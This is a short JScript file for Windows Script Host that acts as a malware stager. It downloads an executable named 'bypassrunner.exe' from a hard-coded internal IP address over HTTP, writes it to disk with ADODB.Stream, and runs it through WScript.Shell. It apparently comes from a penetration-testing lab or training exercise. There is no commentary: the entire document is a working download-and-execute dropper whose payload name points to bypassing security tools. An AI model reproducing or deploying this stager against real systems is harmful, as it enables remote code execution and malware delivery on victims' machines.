var url = "http://172.21.23.10/bypassrunner.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("bypassrunner.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("bypassrunner.exe");